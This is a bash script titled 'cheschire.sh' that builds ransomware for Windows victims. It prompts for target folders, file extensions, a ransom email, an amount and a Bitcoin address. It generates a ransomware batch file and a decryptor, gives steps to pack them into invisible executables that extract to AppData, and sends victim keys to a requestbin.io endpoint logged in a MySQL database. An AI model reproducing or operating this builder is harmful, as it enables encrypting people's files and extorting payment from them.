#!/bin/bash
#coding:utf-8
#title:cheschire.sh
#author:hacknonym
#launch:./cheschire.sh

#terminal text color code
cyan='\e[0;36m'
purple='\e[0;7;35m'
purpleb='\e[0;35;1m'
orange='\e[38;5;166m'
orangeb='\e[38;5;166;1m'
white='\e[0;37;1m'
grey='\e[0;37m'
green='\e[0;32m'
greenb='\e[0;32;1m'
greenh='\e[0;42;1m'
red='\e[0;31m'
redb='\e[0;31;1m'
redh='\e[0;41;1m'
redhf='\e[0;41;5;1m'
yellow='\e[0;33m'
yellowb='\e[0;33;1m'
yellowh='\e[0;43;1m'
blue='\e[0;34m'
blueb='\e[0;34;1m'
blueh='\e[0;44;1m'

CURRENT_PATH=$(pwd)

function user_privs(){
	if [ $EUID -eq 0 ] ; then 
  		echo -n
  	else
  		echo -e "[x] You don't have root privileges"
  		exit 0
	fi
}

function internet(){
	ping -c 1 8.8.4.4 1> /dev/null 2>&1 || { 
		echo -e "[x] No Internet connection"
		return 2
	}
}

function setup(){
	user_privs
	internet
	if [ $? -eq 2 ] ; then
		exit 0
	else
		if [ $(ping requestbin.io -c 1 -W 1 | grep -e "received" | cut -d ' ' -f 4) -ne 1 ] ; then
		  echo -e "$red[+] ping on https://requestbin.io/ error$grey"
		  exit 0
		fi
		echo -e "$green[+] ping on https://requestbin.io/ success$grey"

		if [ $(ping ipinfo.io -c 1 -W 1 | grep -e "received" | cut -d ' ' -f 4) -ne 1 ] ; then
		  echo -e "$red[+] ping on https://ipinfo.io/ error$grey"
		  exit 0
		fi
		echo -e "$green[+] ping on https://ipinfo.io/ success$grey"
	fi
}

function create_ransomware(){
	rm -rf $CURRENT_PATH/output/* && mkdir $CURRENT_PATH/output
	rm -f $CURRENT_PATH/arg.txt
	rm -f $CURRENT_PATH/ext.txt

	echo -e "$green[+] copy virgin/decryptor.ico inside output/$grey"
	cp $CURRENT_PATH/virgin/decryptor.ico $CURRENT_PATH/output/

	default_folder_location="\$home"
	echo -e "put backslash '\\' for \$path variable like \$home"
	echo -e "e.g.$yellow \\\$home/documents$grey"
	echo -ne "$blueb[?]$grey Specify location where to start encryption, powershell default($yellow$default_folder_location$grey)"
	read -p " > " folder_location
	folder_location="${folder_location:-${default_folder_location}}"

	default_cryExtension=".cheschire"
	echo -ne "$blueb[?]$grey Specify an extension for crypted files default($yellow$default_cryExtension$grey)"
	read -p " > " cryExtension
	cryExtension="${cryExtension:-${default_cryExtension}}"

	default_email_rescue="hacker@protonmail.com"
	echo -ne "$blueb[?]$grey Specify an email address to which the victim should address default($yellow$default_email_rescue$grey)"
	read -p " > " email_rescue
	email_rescue="${email_rescue:-${default_email_rescue}}"

	default_ransom_amount="0"
	echo -ne "$blueb[?]$grey Specify the amount of the ransom e.g. 200€, 300$ etc."
	read -p " > " ransom_amount
	ransom_amount="${ransom_amount:-${default_ransom_amount}}"

	echo -ne "$blueb[?]$grey Specify a Bitcoin(₿) address"
	read -p " > " bitcoin_id

	echo -ne "$blueb[?]$grey Specify the location of the fake program that will launch at startup (.exe)"
	read -p " > " program_location
	if [ ! -z $program_location ] ; then
	  echo -e "$green[+] copy and rename $program_location inside output/prog.exe$grey"
	  cp $program_location $CURRENT_PATH/output/prog.exe
	  program_name="prog.exe"
	fi

	echo -ne "$blueb[?]$grey Use default Wallpaper (Y/n)"
	read -p " > " -n 1 -e default_wallpaper
	if [[ "$default_wallpaper" =~ ^[YyOo]$ ]] ; then
	  echo -e "$green[+] copy virgin/wallpaper.jpg inside output/$grey"
	  cp $CURRENT_PATH/virgin/wallpaper.jpg $CURRENT_PATH/output/
	  wallpaper_file="wallpaper.jpg"
	else
		echo -ne "$blueb[?]$grey Specify the location of the wallpaper (.jpg)"
	  	read -p " > " wallpaper_location
	  	if [ ! -z $wallpaper_location ] ; then
	    	echo -e "$green[+] copy and rename $wallpaper_location inside output/wallpaper.jpg$grey"
	    	cp $wallpaper_location $CURRENT_PATH/output/wallpaper.jpg
	   		wallpaper_file="wallpaper.jpg"
		fi
	fi

	echo -ne "$blueb[?]$grey Encrypt all types of files (Y/n)"
	read -p " > " -n 1 -e allext
	if [[ "$allext" =~ ^[YyOo]$ ]] ; then
	  list_extension="*"
	else
		echo -ne "$blueb[?]$grey Use default extensions (Y/n)"
		read -p " > " -n 1 -e defaultext

		if [[ "$defaultext" =~ ^[YyOo]$ ]] ; then
			list_extension="*.png, *.jpg, *.jpeg, *.svg, *.JPG, *.PNG, *.gif, *.xlsx, *.xls, *.docx, *.doc, *.pptx, *ppt, *.psd, *.psb, *.txt, *.bmp, *.mp4, *.mp3, *.m4a, *.avi, *.mov, *.pdf, *.wav, *.epub, *.ods, *.odt, *.odp, *.odb, *.zip, *.rar, *.7z"
			echo -e "$yellowb[i]$grey default -> $yellow$list_extension$grey"
		else
			file="ext.txt"
			rm -f $file && touch $file

			state=1
			echo -e "$yellowb[i]$grey specify extension e.g.$yellow jpg$grey"
			echo -e "$yellowb[i]$grey write$yellow quit$grey when you have finished"
			while [ $state -eq 1 ] ; do
				read -p "> " input_ext
				if [ "$input_ext" = "quit" ] ; then
					state=0
				else
					echo -e "$input_ext" >> $file
				fi
			done

	    	nbline=$(wc -l $file | cut -d ' ' -f 1)
	    	count=1
	   		list_extension=$(
	    		for i in $(cat ext.txt ) ; do 
	    			if [ $count -eq $nbline ] ; then 
	    				echo -e "*.$i"
					else
						echo -n "*.$i, "
	    			fi
	    			count=$(($count + 1))
	    		done
	    	)
	  	fi
	fi

	file2="arg.txt"
	echo -e "Create a Request Bin (not in Private) on https://requestbin.io/"
	echo -ne "$blueb[?]$grey Enter the URL e.g. https://requestbin.io/xxxxxxxx?inspect"
	read -p " > " binurl

	link_bin=$(echo -e "$binurl" | cut -d '/' -f 4 | cut -d '?' -f 1)

	default_ransom_name="ransomware"
	echo -ne "$blueb[?]$grey Enter the ransomware name without space default($yellow$default_ransom_name$grey)"
	read -p " > " ransom_name
	ransom_name="${ransom_name:-${default_ransom_name}}"

	echo -ne "$blueb[?]$grey Specify the location of an icon for the ransomware (.ico)"
	read -p " > " ransom_icon_location
	if [ ! -z $ransom_icon_location ] ; then
	  echo -e "$green[+] copy and rename $ransom_icon_location inside output/$ransom_name.ico$grey"
	  cp $ransom_icon_location $CURRENT_PATH/output/$ransom_name.ico
	  ransom_icon="$ransom_name.ico"
	fi

	echo -e "$green[+] generate output/decrypt0r.bat$grey"
	sed 's+cryExtension+'$cryExtension'+g' $CURRENT_PATH/virgin/decrypt0r.bat | sed 's+folder_location+'$folder_location'+g' > $CURRENT_PATH/output/decrypt0r.bat
	echo -e "$green[+] generate output/$ransom_name.bat$grey"
	sed 's+email_rescue+'$email_rescue'+g' $CURRENT_PATH/virgin/ransomware.bat | sed 's+ransom_amount+'$ransom_amount'+g' | sed 's+bitcoin_id+'$bitcoin_id'+g' | sed 's+cryExtension+'$cryExtension'+g' | sed 's+link_bin+'$link_bin'+g' | sed 's+list_extension+'"$list_extension"'+g' | sed 's+folder_location+'$folder_location'+g' | sed 's+program_name+'$program_name'+g' | sed 's+wallpaper_file+'$wallpaper_file'+g' > $CURRENT_PATH/output/$ransom_name.bat

	echo -e "$green[+] put read rights on output/*$grey"
	sudo chmod +r $CURRENT_PATH/output/*

	echo -e """\n$yellowb[*]$grey Information check
┌───────────────────────────────────────────────────
│Email: $yellow$email_rescue$grey
│Encrypt extension: $yellow$cryExtension$grey
│Bitcoin address: $yellow$bitcoin_id$grey
│Ransom amount: $yellow$ransom_amount$grey
│Resquestbin ID: $yellow$link_bin$grey
│Folder where files will be encrypt: $yellow$folder_location$grey
│Program name: $yellow$program_name$grey
│Wallpaper File: $yellow$wallpaper_file$grey
│Encrypt files: $yellow$list_extension$grey
└────────────────────────────────────────────────────
"""

	echo -e """
┌───────────────────────────────────────────────────
│$white Protocol:$grey
│ Open Bat_to_Exe_converter.exe
│
│ Convert 'decrypt0r.bat' in 'decrypt0r.exe'
│    └─Icon: 'decryptor.ico'
│    └─Exe-Format: '64 Bit | Windows (Invisible)'
│
│ Convert '$ransom_name.bat' in '$ransom_name.exe'
│    └─Embed '$program_name'
│    └─Embed 'decrypt0r.exe'
│    └─Embed '$wallpaper_file'
│    └─Icon: '$ransom_icon'
│    └─Exe-Format: '64 Bit | Windows (Invisible)'
│    └─Extract to: 'AppData'
│    └─Include version informations
└────────────────────────────────────────────────────
"""
	read -p "Push ENTER to continue" enter
	database
}

function database(){
	echo -e "$yellowb[!]$grey To receive the secret key, the victim need to be connect to the Internet"
	read -p "Push ENTER to continue" enter

	if command -v mariadb 1> /dev/null 2>&1 ; then
	  echo -e "$green[*] 'mariadb' already install$grey"
	else
	  echo -en "$green[+] installation of 'mariadb' packages..."
	  sudo apt-get install -y mariadb* 1> /dev/null
	  echo -e "OK$grey"

	  echo -e "\n$yellow Create a user:$grey"
	  echo -e "  └─MariaDB [(none)]>$white CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password';$grey"
	  echo -e "$yellow Grant all privileges:$grey"
	  echo -e "  └─MariaDB [(none)]>$white GRANT ALL PRIVILEGES ON * . * TO 'newuser'@'localhost';$grey"
	fi

	echo -e "\n$yellowb[!]$grey Please specify the credentials of MySQL inside $yellow'ident.txt'$grey file"
	DATABASE_NAME=$(cat $CURRENT_PATH/ident.txt | grep -e "DBNAME" | cut -d ' ' -f 2)
	MYSQL_USER=$(cat $CURRENT_PATH/ident.txt | grep -e "USERNAME" | cut -d ' ' -f 2)
	MYSQL_PASS=$(cat $CURRENT_PATH/ident.txt | grep -e "PASSWORD" | cut -d ' ' -f 2)

	echo -e """$yellowb[*]$grey Current information
┌─────────────────────────────────────────
│DB NAME : $yellow$DATABASE_NAME$grey
│USERNAME: $yellow$MYSQL_USER$grey
│PASSWORD: $yellow$MYSQL_PASS$grey
└─────────────────────────────────────────
"""
	read -p "Push ENTER to continue" enter

	if netstat -puntl | grep -e "LISTEN" | grep -E "3306|mysql" 1> /dev/null 2>&1 ; then
	  echo -e "$green[*] mysql service already launch$grey"
	else
	  echo -en "$green[+] starting mysql service..."
	  sudo service mysql start
	  echo -e "OK$grey"
	fi

	if [ $(mysql --user=$MYSQL_USER --password="$MYSQL_PASS" --database=$DATABASE_NAME --batch -e "SHOW DATABASES;" | grep -e "$DATABASE_NAME") = "$DATABASE_NAME" ] ; then
	  echo -e "$green[*] '$DATABASE_NAME' database already exist$grey"
	else
	  echo -en "$green[+] creation of '$DATABASE_NAME' database..."
	  mysql --user=$MYSQL_USER --password="$MYSQL_PASS" -e "CREATE DATABASE $DATABASE_NAME"
	  mysql -u $MYSQL_USER --password="$MYSQL_PASS" $DATABASE_NAME < $CURRENT_PATH/mydb.sql
	  echo -e "OK$grey"
	fi

	gnome-terminal -t "DATABASE Control Panel" --geometry="80x24" -e "bash displaydb.sh" & 1> /dev/null 2>&1
	./listener.sh $binurl

	exit 0
}

banner(){
	echo -e """$purpleb   ______  __                           __        _                  
 .' ___  |[  |                         [  |      (_)                 
/ .'   \_| | |--.  .---.  .--.   .---.  | |--.   __   _ .--.  .---.  
| |        | .-. |/ /__\\ ( (\`\] / /'\`\] | .-. | [  | [ \`/'\`\]/ /__\\
\ \`.___.'\ | | | || \__., \`'.'. | \__.  | | | |  | |  | |    | \__., 
 \`.____ .'[___]|__]'.__.'[\__) )'.___.'[___]|__][___][___]    '.__.' 
                                                                    """
}

setup
banner
while [ true ] ; do
	echo -e """$white
 1) Create a ransomware
 2) Launch the database control panel
$grey"""
	read -p "> " -n 1 -e option
	case $option in
		1 ) create_ransomware;;
		2 ) 
			echo -ne "$blueb[?]$grey Enter the URL e.g. https://requestbin.io/xxxxxxxx?inspect"
			read -p " > " binurl
			database;;
		* ) echo -e "Error Syntax" && sleep 1;;
	esac
done
